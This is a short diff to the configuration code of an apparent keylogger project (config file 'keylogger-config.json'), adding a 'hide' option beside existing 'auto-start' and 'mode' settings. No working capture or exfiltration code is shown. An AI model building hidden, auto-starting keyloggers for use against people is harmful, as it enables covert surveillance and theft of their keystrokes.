@@ -10,7 +10,8 @@ CONFIG_FILE = 'keylogger-config.json'
 PYTHON_EXEC_PATH = 'python'  # used only when executable=False.
 OPTIONS_CONFIG = {
     "auto-start": [False, True],
-    "mode": ["local", "debug"]
+    "mode": ["local", "debug"],
+    "hide": [False, True]
 }
 
 config = {}
